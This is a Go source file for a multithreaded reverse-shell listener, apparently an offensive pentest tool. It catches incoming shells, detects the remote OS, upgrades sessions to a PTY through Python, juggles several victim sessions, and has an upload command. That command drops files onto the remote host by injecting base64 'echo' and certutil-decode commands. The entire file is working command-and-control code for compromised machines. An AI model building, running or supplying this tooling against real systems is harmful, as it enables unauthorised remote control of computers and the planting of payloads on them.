/* Reverse shell listener
 *
 * @author Sebastian Ko sebastian.ko.dv@gmail.com
 */
package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var ctrlCChan = make(chan os.Signal, 1)
var backgroundCommand = "rev-bg"
var sessionHelpCommand = "rev-help"

func main() {
	fmt.Println("=======================================")
	fmt.Println(" Multithreaded Reverse Shell listener  ")
	fmt.Println(" v0.0.4                                ")
	fmt.Println("=======================================")

	// Keyboard signal notify
	signal.Notify(ctrlCChan, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)

	var destinationPort string
	clients := map[int]*Socket{}

	flag.Parse()
	if flag.NFlag() == 0 && flag.NArg() == 0 {
		fmt.Println("Usage: reverseshell-listener <port>")
		os.Exit(1)
	}

	if _, err := strconv.Atoi(flag.Arg(0)); err != nil {
		fmt.Println("[!] Port cannot be empty and not an integer")
		os.Exit(1)
	} else {
		destinationPort = fmt.Sprintf(":%v", flag.Arg(0))
	}

	fmt.Println("[+] Press Ctrl+C+Enter to quit this application")
	fmt.Println("[+] Listening on port", destinationPort)
	go connectionThread(destinationPort, clients)

	reader := bufio.NewReader(os.Stdin)
	connectedSession := 1
	for {
		select {
		case <-ctrlCChan:
			fmt.Println("\n[+] Application quit successfully")
			os.Exit(0)
		default:
			if len(clients) > 0 && connectedSession == 0 {
				fmt.Print("listener> ")
				text, _ := reader.ReadString('\n')
				connectedSession = commandHandler(text, clients)
			} else if len(clients) > 0 && connectedSession != 0 {
				if !clients[connectedSession].isClosed {
					clients[connectedSession].interact()
				} else {
					fmt.Println("[-] No matched session or session has been closed")
				}
				connectedSession = 0
			}
			time.Sleep(1 * time.Microsecond)
		}

	}
}

func commandHandler(cmd string, clients map[int]*Socket) int {
	connectedSession := 0

	splitCommand := strings.Split(cmd, " ")
	switch strings.TrimSuffix(splitCommand[0], "\n") {
	case "help":
		fmt.Println("sessions \t- List sessions")
		fmt.Println("session <num> \t- Get into session by ID")
	case "exit":
		os.Exit(0)
	case "sessions":
		fmt.Println("--------------------------------------------------------------------->")
		for _, client := range clients {
			fmt.Println(client.status())
		}
		fmt.Println("<---------------------------------------------------------------------")
	case "session":
		connectedSession, _ = strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
		if connectedSession > len(clients) {
			fmt.Println("[!] Wrong session selected")
			connectedSession = 0
		}
	}

	return connectedSession
}

func connectionThread(destPort string, clients map[int]*Socket) {
	listener, err := net.Listen("tcp", destPort)
	if err != nil {
		fmt.Println("[-]", err)
	}
	//Assign session ID
	sessionId := 1
	for {
		// Listen for an incoming connection.
		con, err := listener.Accept()
		if err != nil {
			fmt.Println("[-] Error accepting:", err)
		}
		// Handle connections in a new goroutine.
		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
		socket := &Socket{sessionId: sessionId, con: con}

		// Create system detector
		detector := NewSystemDetector(con)

		// Detect OS
		socket.osType = detector.DetectOS()
		fmt.Println("[+] Session " + strconv.Itoa(sessionId) + " detected OS: " + socket.osType)

		// Check for Python versions if it's a Unix-like system
		if socket.osType == "Linux" || socket.osType == "macOS" {
			socket.pythonVersions = detector.DetectPythonVersions()

			if len(socket.pythonVersions) > 0 {
				fmt.Println("[+] Checking for shell availability...")
				availableShell := detector.DetectShell()

				if availableShell != "" {
					detector.SpawnPTY(socket.pythonVersions, availableShell)
				}
			}
		}

		// Reset read deadline
		con.SetReadDeadline(time.Time{})

		clients[sessionId] = socket
		sessionId = sessionId + 1
	}
}

/*
Socket
*/
type Socket struct {
	sessionId      int
	con            net.Conn
	isBackground   bool
	isClosed       bool
	osType         string
	pythonVersions []string
}

func (s *Socket) interact() {
	if !s.isClosed {
		s.isBackground = false

		fmt.Printf("[+] Interact with Session ID: %d \n", s.sessionId)
		fmt.Printf("[!] Type '%s' to background the current session\n", backgroundCommand)
		fmt.Printf("[!] Type '%s' to show available commands\n", sessionHelpCommand)
		fmt.Println("[+] Happy cracking!")
		// Mark two signal for informational
		stdoutThread := s.copyFromConnection(s.con, os.Stdout)
		stdinThread := s.readingFromStdin(os.Stdin, s.con)
		select {
		case <-stdoutThread:
			fmt.Println("[-] Remote connection is closed")
			// Unexpected session close, force close whole session
			s.isClosed = true
		case <-stdinThread:
			// fmt.Println("[-] DEBUG: Terminated by user",stdinThread)
		}
	} else {
		fmt.Printf("[!] Session %d was closed! \n", s.sessionId)
	}
}

func (s *Socket) copyFromConnection(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	syncChannel := make(chan int)
	go func() {
		// Defer handling
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				if s.isClosed {
					con.Close()
					fmt.Println("[-] Connection closed:", con.RemoteAddr())
				}
			}
			// Notify that processing is finished
			syncChannel <- 0
		}()
		for {
			var nBytes int
			var err error
			nBytes, err = src.Read(buf)
			if s.isBackground || s.isClosed {
				break
			}
			if err != nil {
				if err != io.EOF {
					fmt.Println("[!] Read error:", err)
					s.isClosed = true
				}
				break
			}
			// Not print to stdout if PWN_COMMAND is found
			if strings.Contains(string(buf[0:nBytes]), PWNCommand) {
				continue
			}
			_, err = dst.Write(buf[0:nBytes])
			if err != nil && !s.isClosed {
				fmt.Println("[!] Write error:", err)
				s.isClosed = true
			}
		}
	}()
	return syncChannel
}

func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	syncChannel := make(chan int)
	inputChan := make(chan []byte)

	// Input handler
	// Read on ctrl+c/z and input channel
	go func() {
		for {
			if !s.isClosed && !s.isBackground {
				var sendErr error
				select {
				case <-ctrlCChan:
					// Ctrl+C handle
					result := s.prompt(fmt.Sprintf("\n[+] Do you really want to kill session [%d] ?", s.sessionId), inputChan)
					if result {
						s.isClosed = true
						fmt.Println("[!] Press Enter to continue ..")
						return
					} else {
						_, sendErr = dst.Write([]byte("\003\n"))
					}
				case buf := <-inputChan:
					// Normal input channel
					_, sendErr = dst.Write(buf)
				}
				if sendErr != nil && !s.isClosed {
					fmt.Println("\n[!] Write error:", sendErr)
					s.isClosed = true
				}
			} else {
				break
			}
		}
	}()

	go func() {
		// Defer handling
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				if s.isClosed {
					con.Close()
					fmt.Println("\n[-] Connection killed:", con.RemoteAddr())
				} else {
					fmt.Println("\n[-] Backgrounded session", s.sessionId, ", status:", s.isBackground)
				}
			}

			//Cleanup
			close(inputChan)
			// Notify that processing is finished
			syncChannel <- 0
		}()
		for {
			var nBytes int
			var err error

			nBytes, err = src.Read(buf)
			// Special command
			command := strings.TrimSuffix(string(buf[0:nBytes]), "\n")
			commandExecuted := s.inSessionCommandHandler(command, src, dst)

			if s.isBackground || s.isClosed {
				break
			}
			if err != nil {
				if err != io.EOF {
					fmt.Println("[!] Read error:", err)
					s.isClosed = true
				}
				break
			}

			// Send input to the input channel
			if !commandExecuted {
				inputChan <- buf[0:nBytes]
			} else {
				fmt.Println("[!] Press Enter to continue ..")
			}
		}
	}()
	return syncChannel
}

func (s *Socket) prompt(message string, inputChan chan []byte) bool {
	for {
		if !s.isClosed && !s.isBackground {
			fmt.Print(message + " (Y/N): ")
			buf := <-inputChan
			input := strings.TrimSuffix(string(buf), "\n")
			input = strings.ToUpper(input)
			if input == "Y" || input == "N" {
				return input == "Y"
			}
		} else {
			return false
		}
	}
}

func (s *Socket) status() string {
	return fmt.Sprintf("Session ID: [%d], Connection <%s> Seesion killed [%t]", s.sessionId, s.con.RemoteAddr(), s.isClosed)
}

func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool {
	myipCommand := "rev-myip"
	uploadCommand := "rev-upload"

	if strings.HasPrefix(command, "rev-") {
		fmt.Println("<---------------------------------------------------------------------")
		// Split command and arguments
		parts := strings.Fields(command)
		cmd := parts[0]

		switch cmd {
		case sessionHelpCommand:
			fmt.Println(backgroundCommand, "- Background the session")
			fmt.Println(myipCommand, "- Display host ip address")
			fmt.Println(uploadCommand, " <file> - Upload a file to the remote host's current directory")
		case backgroundCommand:
			fmt.Println("[+] Move the current session to background..")
			s.isBackground = true
		case myipCommand:
			ifaces, _ := net.Interfaces()
			fmt.Println("[+] Host IP Address..")
			for _, i := range ifaces {
				addrs, _ := i.Addrs()
				for _, addr := range addrs {
					var ip net.IP
					switch v := addr.(type) {
					case *net.IPNet:
						ip = v.IP
					case *net.IPAddr:
						ip = v.IP
					}
					if ip == nil || ip.IsLoopback() {
						continue
					}
					fmt.Println("[+] Address: [", ip, "] \t Interface: [", i.Name, "]")
				}
			}
		case uploadCommand:
			if len(parts) < 2 {
				fmt.Println("[-] Usage:", uploadCommand, "<file>")
				return true
			}

			localPath := parts[1]
			// Check if file exists
			fileInfo, err := os.Stat(localPath)
			if os.IsNotExist(err) {
				fmt.Println("[-] File does not exist:", localPath)
				return true
			}

			// Read file content
			fileContent, err := os.ReadFile(localPath)
			if err != nil {
				fmt.Println("[-] Error reading file:", err)
				return true
			}

			// Get filename from path
			fileName := filepath.Base(localPath)

			// Create a progress indicator
			done := make(chan bool)
			go func() {
				seconds := 0
				for {
					select {
					case <-done:
						return
					default:
						// Simulate progress
						time.Sleep(1000 * time.Millisecond)
						seconds += 1
						fmt.Printf("\r[+] %s ... (%ds)", fileName, seconds)
					}
				}
			}()

			// Create base64 encoded content
			encodedContent := base64.StdEncoding.EncodeToString(fileContent)

			// Create upload command based on OS
			var uploadCmd string
			if s.osType == "Windows" {
				uploadCmd = fmt.Sprintf("echo %s > temp.b64 && certutil -decode temp.b64 %s && del temp.b64", encodedContent, fileName)
			} else {
				uploadCmd = fmt.Sprintf("echo %s | base64 -d > %s", encodedContent, fileName)
			}

			// Show file size
			fileSize := fileInfo.Size()
			fmt.Printf("[+] Uploading %s (%d bytes)...\n", fileName, fileSize)

			// Send upload command
			if _, err := dst.Write([]byte(uploadCmd + "\n")); err != nil {
				fmt.Println("[-] Error sending upload command:", err)
				done <- true
				return true
			}

			done <- true

			// Show progress
			fmt.Printf("[+] File upload command sent\n")
			fmt.Printf("[+] Waiting for remote host to process the file...\n")

			fmt.Println("[+] File upload completed")
			return true
		}
		fmt.Println("--------------------------------------------------------------------->")
		return true
	}

	//Default
	return false
}
